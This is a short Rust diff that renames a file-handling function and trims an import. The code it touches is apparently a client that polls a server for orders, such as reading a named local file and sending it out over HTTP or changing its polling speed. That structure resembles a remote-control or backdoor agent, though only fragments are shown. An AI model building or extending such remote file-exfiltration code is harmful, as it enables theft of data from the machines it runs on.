@@ -4,7 +4,7 @@ use std::{
     time::Duration,
     process::{Command, Output},
     str,
-    env::{current_dir, self}
+    env
 };
 use reqwest::{header::CONTENT_TYPE};
 use serde::{Serialize, Deserialize};
@@ -90,7 +90,7 @@ async fn sending_request(t : u64) -> Option<u64>{
                                 },
                                 OrdreType::GetFichier => {
                                     let filename = v.arguments[0].as_str();
-                                    send_file(filename).await;
+                                    get_file(filename).await;
                                 }
                                 OrdreType::Vitesse => {
                                     let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
@@ -124,7 +124,7 @@ async fn sending_request(t : u64) -> Option<u64>{
 }
 
 
-async fn send_file(filename: &str) -> () {
+async fn get_file(filename: &str) -> () {
     let client = reqwest::Client::new();
 
     let file = std::fs::read(filename).unwrap();
